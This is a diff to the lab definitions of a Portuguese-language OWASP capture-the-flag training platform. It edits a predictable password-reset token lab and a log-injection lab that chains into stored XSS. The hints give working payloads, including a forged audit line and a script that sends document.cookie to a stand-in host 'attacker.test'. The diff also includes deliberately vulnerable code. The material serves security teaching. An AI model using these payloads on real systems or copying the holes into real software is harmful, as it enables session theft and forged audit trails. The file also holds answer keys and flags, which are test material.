@@ -295,16 +295,18 @@ const user = db.prepare(
     primer:
       'O QUE É INSECURE DESIGN (A04)? É uma falha na CONCEPÇÃO do controle, não um bug pontual de implementação. Mesmo com o código "escrito certo", o desenho é inseguro — faltou pensar nos abusos na fase de projeto (threat modeling / abuse cases). Exemplo clássico: um fluxo de "esqueci a senha" cujo token de recuperação é previsível (deriva do tempo, de um contador, ou tem pouca entropia). Nenhum patch de linha única resolve: é preciso REPROJETAR o fluxo (token de CSPRNG, hash armazenado, expiração curta, uso único, rate-limit).\n\nCOMO EXPLORAR: descubra de onde o token é derivado. Se for o relógio do servidor, obtenha esse relógio (ex.: um endpoint /server-time) e PREVEJA o token da vítima dentro da janela aceita.\n\nReferências: OWASP A04:2021 · CWE-640 (Weak Password Recovery) · OWASP Forgot Password Cheat Sheet. Links na aba Referências.',
     objective:
-      'O fluxo de "esqueci minha senha" gera o token de recuperação a partir do próprio relógio do servidor (segundo epoch) — zero aleatoriedade. Dispare o reset do admin, descubra o relógio do servidor e preveja o token para redefinir a senha dele. Sucesso = a conta do admin ser tomada e revelar o dado de recuperação.',
+      'O fluxo de "esqueci minha senha" gera o token de recuperação a partir do próprio relógio do servidor (segundo epoch) — zero aleatoriedade. Dispare o reset do admin, confirme no log de auditoria do gateway de e-mail que o link FOI enviado (mas o token vem mascarado — você nunca teria acesso a ele por aí), descubra o relógio do servidor e preveja o token para redefinir a senha dele. Sucesso = a conta do admin ser tomada e revelar o dado de recuperação.',
     context:
-      'Passo 6 — consolidando o controle. Já com visão de admin, você quer posse PERMANENTE da conta da Diretoria, independente de token forjado. Analisando o fluxo de recuperação da Nexus, descobre uma falha de DESIGN (não um bug pontual): o token de reset é derivado do horário do servidor, e o endpoint /server-time entrega esse relógio de bandeja. Previsibilidade de token de reset é um clássico de "Insecure Design" — o controle já nasceu quebrado na prancheta.',
+      'Passo 6 — consolidando o controle. Já com visão de admin, você quer posse PERMANENTE da conta da Diretoria, independente de token forjado. Analisando o fluxo de recuperação da Nexus, descobre uma falha de DESIGN (não um bug pontual): o token de reset é derivado do horário do servidor, e o endpoint /server-time entrega esse relógio de bandeja. O log de auditoria do gateway de e-mail confirma que a mensagem foi enviada, mas o conteúdo com o link vem mascarado — nem a Nexus consegue ler o próprio token depois de enviado. Previsibilidade de token de reset é um clássico de "Insecure Design" — o controle já nasceu quebrado na prancheta.',
     baseEndpoint: 'POST /api/a04/reset',
     exampleRequests: [
-      { method: 'POST', path: '/api/a04/forgot', body: '{"username":"admin"}', note: 'Baseline: dispara o fluxo de recuperação do admin. O token NÃO é enviado a você (é mandado "por e-mail") — você vai ter que prevê-lo.' },
+      { method: 'POST', path: '/api/a04/forgot', body: '{"username":"admin"}', note: 'Baseline: dispara o fluxo de recuperação do admin e registra o envio do e-mail.' },
+      { method: 'GET', path: '/api/a04/mailbox/admin', note: 'Log de auditoria do gateway de e-mail: confirma que a mensagem foi enviada (destinatário, assunto, horário), mas o link/token vem mascarado — nem esse log interno guarda o segredo em claro.' },
       { method: 'GET', path: '/api/a04/server-time', note: 'Revela o relógio do servidor (epochSeconds) — a base previsível do token.' },
       { method: 'POST', path: '/api/a04/reset', body: '{"username":"admin","token":"PREVISTO","newPassword":"Hacked#1"}', note: 'Baseline: substitua "PREVISTO" pelo epochSeconds que você obteve no /server-time.' },
     ],
     hints: [
+      'O e-mail de reset existe de verdade (confira em GET /api/a04/mailbox/admin após o /forgot) — mas o token vem mascarado por DLP. Ler o e-mail não é o caminho; prever o token é.',
       'O token de reset é simplesmente o segundo epoch atual do servidor — não há hash, sal nem aleatoriedade. O design é o bug.',
       'Faça GET /api/a04/server-time e use o valor de epochSeconds como token (a API aceita uma pequena janela de tempo).',
       'Envie POST /api/a04/reset com {"username":"admin","token":<epochSeconds>,"newPassword":"..."}.',
@@ -611,60 +613,77 @@ app.post('/import-profile', (req, res) => {
     id: 'a09-log-injection',
     owaspId: 'A09',
     owaspTitle: 'Security Logging and Monitoring Failures',
-    killChain: { step: 10, uses: 'Tudo o que você fez até aqui — agora é hora de apagar os rastros no subsistema de auditoria.', provides: 'Cobertura final: uma trilha de auditoria forjada que engana o SOC e fecha a intrusão.' },
+    killChain: { step: 10, uses: 'Tudo o que você fez até aqui — agora é hora de apagar os rastros no subsistema de auditoria.', provides: 'Cobertura final: uma trilha de auditoria forjada que engana o SOC e, ao ser aberta no dashboard, sequestra a sessão do próprio analista — fechando a intrusão.' },
     title: 'Log injection / forjando trilha de auditoria',
     difficulty: 'Intermediario',
     points: 150,
     cwe: 'CWE-117',
-    tags: ['Logging', 'Log Injection', 'CRLF', 'Monitoring'],
+    tags: ['Logging', 'Log Injection', 'CRLF', 'Monitoring', 'Stored XSS'],
     tools: ['crlf'],
     primer:
-      'O QUE É FALHA DE LOGGING E MONITORAMENTO (A09)? Duas faces: (1) não registrar/alertar eventos de segurança suficientes (ataques passam despercebidos); (2) registrar entrada não confiável SEM neutralizar — o caso deste lab, LOG INJECTION (CRLF). Se a entrada do usuário é concatenada no log e você não escapa quebras de linha (\\r\\n), o atacante escreve LINHAS inteiras de log: forja eventos, apaga rastros, engana o SOC e pode até injetar payloads que o SIEM/dashboard interpreta. Se o atacante controla o seu log, ele controla a sua investigação.\n\nCOMO EXPLORAR: injete um \\n no campo logado seguido de uma linha no formato que o parser de auditoria reconhece como evento legítimo (ex.: um "login admin bem-sucedido").\n\nReferências: OWASP A09:2021 · CWE-117 (Improper Output Neutralization for Logs) · OWASP Logging Cheat Sheet. Links na aba Referências.',
+      'O QUE É FALHA DE LOGGING E MONITORAMENTO (A09)? Duas faces: (1) não registrar/alertar eventos de segurança suficientes (ataques passam despercebidos); (2) registrar e EXIBIR entrada não confiável SEM neutralizar — o caso deste lab, em DUAS camadas. Camada 1: LOG INJECTION (CRLF) — se a entrada do usuário é concatenada no log sem escapar quebras de linha (\\r\\n), o atacante escreve LINHAS inteiras de log, forjando eventos. Camada 2 (a parte que eleva o risco): o mesmo log cru costuma ser renderizado num painel/dashboard para o analista ler — se esse painel também não neutraliza HTML, o que era "só" uma linha de log forjada vira um <script> executando na SESSÃO DO ANALISTA (Stored XSS contra quem está monitorando). É assim que log injection deixa de ser cosmético e vira comprometimento real: o atacante não engana só o texto, ele ataca a FERRAMENTA de monitoramento.\n\nCOMO EXPLORAR: (1) injete um \\n no campo logado seguido de uma linha no formato que o parser de auditoria reconhece como evento legítimo; (2) na MESMA entrada, inclua um <script> — quando o dashboard do SOC renderizar o log sem escapar, o script "roda" na sessão de quem está lendo.\n\nReferências: OWASP A09:2021 · CWE-117 (Improper Output Neutralization for Logs) · CWE-79 (XSS) · OWASP Logging e XSS Cheat Sheets. Links na aba Referências.',
     objective:
-      'O logger grava a entrada do usuário sem neutralizar quebras de linha. Injete um \\n no campo username para forjar uma linha de auditoria inteira — um evento "admin_login_success" que você não realizou. Sucesso = o parser de auditoria aceitar o evento forjado e liberar o override de incidente.',
+      'O logger grava a entrada do usuário sem neutralizar quebras de linha, E o dashboard do SOC renderiza esse log como HTML sem escapar nada. Uma única falha, duas camadas quebradas. Primeiro, injete um \\n no username para forjar uma linha "AUDIT event=admin_login_success" (prova de log injection). Depois, na MESMA técnica, injete também um <script> e abra o dashboard: as DUAS coisas juntas — evento forjado + script — são o que libera o clearance de verdade. Forjar sozinho não é suficiente: é preciso encadear log injection com a falha de encoding na visualização.',
     context:
-      'Passo 10 — cobrindo os rastros. Depois do RCE, falta enganar quem vai investigar. O /api/a09/login da Nexus grava "AUTH user=<entrada>" no log concatenando a entrada crua. Como não há sanitização de CRLF, você injeta uma quebra de linha e ESCREVE uma linha de log falsa que o parser de auditoria lê como legítima. É a cara do A09 (falhas de logging/monitoramento) e prima do CVE-2021-44228 "Log4Shell", onde o que entrava no log virava execução de código.',
-    baseEndpoint: 'POST /api/a09/login',
+      'Passo 10 — cobrindo os rastros. Depois do RCE, falta enganar quem vai investigar. O /api/a09/login da Nexus grava "AUTH user=<entrada>" no log concatenando a entrada crua — sem sanitização de CRLF, você forja uma linha de auditoria inteira. Mas o verdadeiro prêmio está no /api/a09/dashboard: o painel que o analista do SOC abre para ler essa trilha renderiza o log como HTML, também sem escapar nada. A mesma causa-raiz (confiar em entrada não confiável) agora compromete a FERRAMENTA de monitoramento — seu <script> injetado roda na sessão de quem deveria estar te caçando. É a cara do A09 levado ao extremo, prima do CVE-2021-44228 "Log4Shell" (texto logado virando execução) e de incidentes reais onde o próprio dashboard de segurança foi o vetor.',
+    baseEndpoint: 'POST /api/a09/login · GET /api/a09/dashboard',
     exampleRequests: [
       { method: 'POST', path: '/api/a09/login', body: '{"username":"ana.paula"}', note: 'Baseline: gera uma linha de log normal (AUTH user=ana.paula).' },
       { method: 'GET', path: '/api/a09/logs', note: 'Veja como o log é estruturado (uma entrada por linha). Explore: injete uma quebra de linha no username para forjar uma segunda linha.' },
+      { method: 'GET', path: '/api/a09/dashboard', note: 'Baseline: o painel do SOC renderiza o mesmo log como HTML. Observe que nada é escapado — qualquer tag no log vira HTML de verdade aqui.' },
     ],
     hints: [
-      'A entrada é concatenada no log sem escapar \\n (newline). Uma quebra de linha no username cria uma LINHA de log inteiramente controlada por você.',
-      'O parser de auditoria procura, em cada linha, um evento no formato AUDIT event=<nome>. Forje um evento de sucesso administrativo.',
-      'No username, envie: x\\nAUDIT event=admin_login_success user=ceo (o \\n é uma quebra de linha real).',
+      'Passo 1 (log injection): a entrada é concatenada no log sem escapar \\n. Uma quebra de linha no username cria uma LINHA de log inteiramente controlada por você: x\\nAUDIT event=admin_login_success user=ceo.',
+      'Passo 2 (a parte que FALTAVA): GET /api/a09/dashboard mostra que o log vira HTML sem nenhum escaping. Isso significa que uma linha logada com um <script> vai parar, intacta, dentro do HTML do painel.',
+      'Combine os dois na MESMA entrada de username: x\\nAUDIT event=admin_login_success user=ceo\\n<script>fetch(\'https://attacker.test/exfil?c=\'+document.cookie)</script> — depois chame POST /api/a09/login com isso e então GET /api/a09/dashboard. Só com o evento forjado E o script presentes juntos o painel reporta a sessão do analista sequestrada (clearanceToken).',
     ],
     writeup: {
       rootCause:
-        'Entrada não confiável é escrita no log sem neutralizar caracteres de controle (CRLF). O atacante forja entradas inteiras, corrompe a trilha de auditoria e esconde/impersona eventos. A categoria cobre também a ausência de monitoramento efetivo — logs que ninguém consegue confiar são tão ruins quanto não ter log.',
+        'Entrada não confiável é escrita no log sem neutralizar caracteres de controle (CRLF) — o atacante forja linhas inteiras. Isso já seria A09 sozinho, mas a falha se agrava porque o PAINEL que exibe esse log para o analista também não neutraliza a saída (falta de encoding ao renderizar como HTML, CWE-79). O resultado é uma cadeia: log injection vira Stored XSS contra a própria ferramenta de monitoramento — quem deveria investigar o ataque é quem acaba comprometido.',
       impact:
-        'Logs não confiáveis atrapalham resposta a incidentes e forense, podem injetar payloads em dashboards de SIEM e mascarar atividade maliciosa. Levado ao extremo, o CVE-2021-44228 "Log4Shell" (CVSS 10.0) mostrou que entrada logada sem tratamento virava RCE direto. Se o atacante escreve no seu log, ele controla a sua investigação.',
+        'Logs não confiáveis atrapalham resposta a incidentes e forense; quando o pipeline de visualização também não escapa a saída, o impacto deixa de ser "só" trilha corrompida e vira execução de código na sessão do analista — roubo de cookies/tokens de quem monitora, movimentação lateral dentro da própria ferramenta de segurança. O CVE-2021-44228 "Log4Shell" (CVSS 10.0) já mostrou que entrada logada sem tratamento vira RCE; aqui a mesma lição se repete na camada de apresentação: se o atacante controla o que entra no seu log E o seu dashboard não escapa a saída, ele controla quem investiga.',
       vulnerableLanguage: 'typescript',
       vulnerableCode: `router.post('/login', (req, res) => {
-  // FALHA: concatena entrada crua no log (CRLF injection)
+  // FALHA 1: concatena entrada crua no log (CRLF injection)
   log += 'AUTH user=' + req.body.username + '\\n';
   res.json({ ok: true });
+});
+
+router.get('/dashboard', (req, res) => {
+  // FALHA 2: renderiza o log como HTML SEM escapar nada
+  const html = log.split('\\n').map(l => \`<div>\${l}</div>\`).join('');
+  res.send(html); // qualquer <script> no log EXECUTA na sessao de quem abrir isso
 });`,
       secureLanguage: 'typescript',
-      secureCode: `function sanitize(s) {
+      secureCode: `function sanitizeForLog(s) {
   return String(s).replace(/[\\r\\n\\t]/g, ' ').slice(0, 256);
 }
+function escapeHtml(s) {
+  return String(s).replace(/[&<>"']/g, (c) => ({ '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;' }[c]));
+}
 router.post('/login', (req, res) => {
-  logger.info({ event: 'auth_attempt', user: sanitize(req.body.username) });
-  // logging estruturado (JSON) separa campos de valores
+  logger.info({ event: 'auth_attempt', user: sanitizeForLog(req.body.username) });
+  // logging estruturado (JSON) separa campos de valores — impede CRLF injection
   res.json({ ok: true });
+});
+router.get('/dashboard', (req, res) => {
+  const html = log.split('\\n').map(l => \`<div>\${escapeHtml(l)}</div>\`).join('');
+  res.send(html); // escapar na SAIDA, nao so sanitizar na entrada
 });`,
       remediation: [
         'Sanitize/escape CRLF e caracteres de controle antes de logar entrada do usuário.',
         'Use logging estruturado (JSON) — campos separados impedem forja de linhas.',
-        'Centralize logs (SIEM), com alertas para eventos críticos (logins admin, falhas repetidas).',
+        'Escape SEMPRE a saída ao renderizar logs em qualquer UI/dashboard (HTML entity encoding) — sanitizar só a entrada não basta se a saída não for tratada.',
+        'Centralize logs (SIEM), com alertas para eventos críticos (logins admin, falhas repetidas) e trate o próprio painel de monitoramento como superfície de ataque.',
         'Garanta logging suficiente de eventos de segurança + retenção + integridade (append-only).',
       ],
     } as LabWriteup,
     references: [
       { label: 'OWASP A09:2021 Security Logging and Monitoring Failures', url: 'https://owasp.org/Top10/A09_2021-Security_Logging_and_Monitoring_Failures/' },
       { label: 'OWASP Logging Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Logging_Cheat_Sheet.html' },
+      { label: 'OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html' },
       { label: 'CWE-117: Improper Output Neutralization for Logs', url: 'https://cwe.mitre.org/data/definitions/117.html' },
+      { label: 'CWE-79: Improper Neutralization of Input During Web Page Generation (XSS)', url: 'https://cwe.mitre.org/data/definitions/79.html' },
       { label: 'Caso real: CVE-2021-44228 "Log4Shell" — input logado vira RCE (CVSS 10.0)', url: 'https://nvd.nist.gov/vuln/detail/CVE-2021-44228' },
     ],
     flag: 'CYBER{a09_never_trust_unsanitized_log_input}',
